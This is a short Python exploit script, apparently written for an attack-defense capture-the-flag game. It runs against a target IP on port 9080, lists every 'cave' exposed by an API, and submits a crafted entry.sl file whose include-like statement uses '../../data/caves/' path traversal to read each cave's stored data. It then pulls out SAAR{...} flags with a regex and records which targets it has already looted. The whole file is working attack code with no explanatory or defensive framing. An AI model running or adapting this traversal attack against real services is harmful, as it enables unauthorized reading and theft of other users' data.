#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys, re, requests
import string, random, uuid, re, json
from storage import storage_set, storage_get

ip = sys.argv[1]

url = 'http://' + ip + ':9080'


s = requests.Session()

caves = s.get(url + '/api/caves/list').json()

for cave in caves:
    if not storage_get(ip + ':' + str(cave["id"])):
        id = cave["id"]
        json = {"files": {"entry.sl": "holmol \"../../data/caves/{}\";".format(id)}, "cave_id": id}
        html = s.post(url + '/api/visit', json=json, timeout=(None, None)).text
        flag = re.findall('SAAR\{[A-Za-z0-9-_]{32}\}', html)
        if flag:
            print(flag, flush=True)
            storage_set(ip + ':' + str(id))
            continue


